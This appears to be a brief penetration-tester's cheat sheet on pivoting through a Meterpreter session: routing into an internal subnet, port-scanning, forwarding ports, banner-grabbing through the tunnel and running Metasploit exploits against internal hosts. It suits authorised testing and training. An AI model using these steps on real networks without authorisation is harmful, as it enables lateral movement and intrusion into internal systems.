`ipconfig`

use meterpreter to route to internal network
`run autoroute -s <ip>/<cidr>`

with known ip, run `auxiliary/scanner/portscan/tcp` against it

set up tunnel with meterpreter
```
portfwd add -l <lport> -p <rport> -r <target>
portfwd list
```
`nmap -sV -sS -p <lport> localhost` to banner grab through tunnel

use metasploit exploits with remote target as RHOST to exploit through pivot host to internal target
